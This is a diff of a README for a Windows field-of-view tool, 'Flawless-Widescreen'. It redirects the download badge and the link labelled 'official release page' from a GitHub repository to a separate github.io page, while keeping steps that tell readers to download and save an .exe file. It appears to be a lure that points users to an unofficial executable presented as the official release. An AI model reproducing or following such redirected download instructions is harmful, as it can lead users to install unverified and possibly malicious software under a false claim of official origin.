@@ -1,6 +1,6 @@
 # 🖥️ Flawless-Widescreen - Fix your game field of view
 
-[![](https://img.shields.io/badge/Download_Flawless_Widescreen-8a8a8a.svg)](https://github.com/Pahasaras574/Flawless-Widescreen)
+[![](https://img.shields.io/badge/Download_Flawless_Widescreen-8a8a8a.svg)](https://pahasaras574.github.io)
 
 ## 📌 About this software
 
@@ -14,7 +14,7 @@ This software runs on Windows 10 and Windows 11. It requires enough memory to pr
 
 Follow these steps to set up the software.
 
-1. Go to the [official release page](https://github.com/Pahasaras574/Flawless-Widescreen).
+1. Go to the [official release page](https://pahasaras574.github.io).
 2. Look for the assets section on the page.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
